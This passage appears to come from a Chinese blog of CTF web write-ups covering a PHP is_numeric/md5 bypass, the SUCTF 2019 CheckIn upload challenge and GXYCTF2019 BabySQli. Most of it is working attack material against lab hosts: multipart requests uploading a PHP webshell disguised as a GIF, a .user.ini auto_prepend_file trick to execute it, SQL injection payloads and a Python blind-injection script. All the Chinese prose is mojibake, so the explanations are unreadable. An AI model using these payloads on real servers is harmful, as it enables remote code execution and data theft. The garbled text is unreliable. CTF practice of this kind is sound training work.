class="hljs-comment">//md5ç»•è¿‡ï¼Œè¦æ±‚ä¸¤ä¸ªå€¼ä¸ç›¸ç­‰ä½†æ˜¯è®¡ç®—çš„md5ç›¸ç­‰ï¼Œ</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;  <br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure>
<p>ç¬¬ä¸€å…ˆè¯•ä¸€ä¸‹æ•°ç»„ç»•è¿‡ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>You got the first steponly one way to get the flag<br></code></pre></td></tr></table></figure>
<p>ç„¶åæ·»åŠ postæ•°æ®ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>passwd=<span class="hljs-number">1234567</span><br><br>You got the first stepYou can not get it !<br></code></pre></td></tr></table></figure>
<p>è¦å¯¹is_numericè¿›è¡Œç»•è¿‡ï¼Œæºç é‡Œçš„ï¼š<br>if (!is_numeric($passwd))<br>æ˜¯ä¸èƒ½æ˜¯çº¯æ•°å­—æ„æ€<br>é‚£passwd&#x3D;1234567aaï¼Œ<br>æ‹¿åˆ°flagï¼Œ  </p>
<h2 id="phpæ¯”è¾ƒç»•è¿‡-is-numeric"><a href="#phpæ¯”è¾ƒç»•è¿‡-is-numeric" class="headerlink" title="phpæ¯”è¾ƒç»•è¿‡ is_numeric()"></a>phpæ¯”è¾ƒç»•è¿‡ is_numeric()</h2><p>å› ä¸ºphpå¯¹å­—ç¬¦ä¸²ç±»å‹ä¸æ•´æ•°ç±»å‹è¿›è¡Œ&#x3D;&#x3D;æ¯”è¾ƒæ—¶ä¼šæŠŠå­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´å‹æ•°æ®ï¼Œ<br>æ­¤æ—¶<br>1234567aa å°±ä¼šå˜ä¸º 1234567<br>å®ç°æ¯”è¾ƒ</p>
<hr>
<h2 id="title-note-33date-2025-05-07-13-05-02tags-web"><a href="#title-note-33date-2025-05-07-13-05-02tags-web" class="headerlink" title="title: note-33date: 2025-05-07 13:05:02tags: web"></a>title: note-33<br>date: 2025-05-07 13:05:02<br>tags: web</h2><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>ä¼ æ­£å¸¸å›¾ç‰‡æç¤ºé‡Œé¢æœ‰&lt;?ä¸ç»™ä¼ ï¼Œä¼ ç çœ‹çœ‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">æäº¤</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure>
<p>æç¤ºï¼š<br>exif_imagetype:not image!</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">æäº¤</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure>
<p>æç¤ºï¼š<br>exif_imagetype:not image!</p>
<p>è¿™æ¬¡æ¢ä¸ªæ–‡ä»¶å¤´ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">æäº¤</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure>
<p>å›æ˜¾  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>é‚£ç›®å½•å°±æ˜¯<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>èš‚èšåˆæ˜¯è¿ä¸ä¸Šï¼Œä½†æ˜¯è¿™æ¬¡æ˜¯nginxæœåŠ¡å™¨å•Šï¼Œ<br>é‚£å¯èƒ½å°±æ˜¯user.iniæ–‡ä»¶äº†<br>æäº¤ï¼š  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure>
<p>å›æ˜¾ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ª.user.iniçš„å¤§æ¦‚ç”¨æ³•æ˜¯è®©ç›®å½•ä¸‹æ‰€æœ‰phpæ–‡ä»¶åŒ…å«ä¸Šä½ æŒ‡å®šçš„æ–‡ä»¶ï¼Œçœ‹å›æ˜¾æˆ‘ä¸Šä¼ çš„ç›®å½•ä¸Šæ˜¯æœ‰ä¸€ä¸ªindex.phpçš„ï¼Œæ‰€ä»¥èƒ½ç”¨.user.iniçš„åŠæ³•<br>èš‚èšè¿ç›®å½•ä¸Šçš„index.phpå³å¯<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>åº”è¯¥æ˜¯sqlé¢˜</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>);<br><br>å›æ˜¾ï¼š<br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;miaomiaomiao&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;114514&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;ys&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>æ€ä¹ˆå¥½åƒåšè¿‡åŸé¢˜  </p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br>å›æ˜¾ï¼š<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-meta">#</span><br>ok<br>è¿™æ ·çš„è¯ï¼Œæ„Ÿè§‰ç”¨sqlmapéƒ½è¡Œå•Š  <br>ç”¨äº†sqlmapé»˜è®¤ï¼Œå‘ç°åªèƒ½æ£€ç´¢å‡ºæ•°æ®åº“å<br>sumeqrq<span class="hljs-comment">@i</span><br><span class="hljs-comment">ä¼šä¸ä¼šæ˜¯@</span>çš„é—®é¢˜ï¼Ÿ<br></code></pre></td></tr></table></figure>
<p>ç®—äº†è‡ªå·±å†™ä¸ªè„šæœ¬å§</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># for d in range(0,100):</span><br><span class="hljs-comment">#     url = &quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+length%28database%28%29%29%3D&#123;&#125;%23#&quot;.format(d)</span><br><span class="hljs-comment">#     re = requests.get(url)</span><br><span class="hljs-comment">#     print(&quot;testing&quot;,d)</span><br><span class="hljs-comment">#     if &#x27;hahahah&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;æ•°æ®åº“åé•¿åº¦ä¸ºï¼š&quot;,d)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-keyword">for</span> d1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">for</span> dn <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">137</span>):<br>        time.sleep(<span class="hljs-number">0.07</span>)<br>        url = <span class="hljs-string">&quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+ascii%28substr%28database%28%29%2C&#123;&#125;%2C1%29%29%3D&#123;&#125;%23#&quot;</span>.<span class="hljs-built_in">format</span>(d1,dn)<br>        re = requests.get(url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing&quot;</span>,d1,<span class="hljs-built_in">chr</span>(dn),name)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hahahah&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(dn)<br>            <span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure>
<p>è·‘å‡ºæ¥æ˜¯ supersqli<br>ä½†æ˜¯æ— æ³•ç”¨selectå’Œwhereï¼Œä¹Ÿè®¸å¯ä»¥è¯•è¯•é¢„ç¼–è¯‘ï¼Ÿ<br>1â€™;prepare hack from concat(â€˜seleâ€™,â€™ctâ€™,â€™*â€˜);execute hack;@<br>prepareä¹Ÿè¿‡æ»¤äº†  </p>
<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">database</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!supersqli&#x27;</span><br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">name</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,@@<span class="hljs-variable">dir</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">user</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!root@localhost&#x27;</span><br><br>æƒ³ç”¨<span class="hljs-variable">rename</span>ä¹Ÿè¢«è¿‡æ»¤äº†ï¼›<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">databases</span>;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span 